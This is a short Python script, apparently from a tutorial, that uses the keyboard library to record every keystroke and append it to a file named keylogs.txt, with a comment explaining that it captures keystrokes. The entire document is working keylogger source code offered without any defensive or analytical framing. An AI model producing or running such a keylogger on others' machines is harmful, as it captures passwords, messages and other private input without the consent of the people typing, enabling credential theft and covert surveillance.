import keyboard
file = 'keylogs.txt'
def key_press(event):
    with open(file, 'a') as f:
        f.write('{}\n'.format(event.name))
keyboard.on_press(key_press) #the ‘key_press’ function is called whenever a key is pressed. This will enable our code to capture the keystrokes.
keyboard.wait()
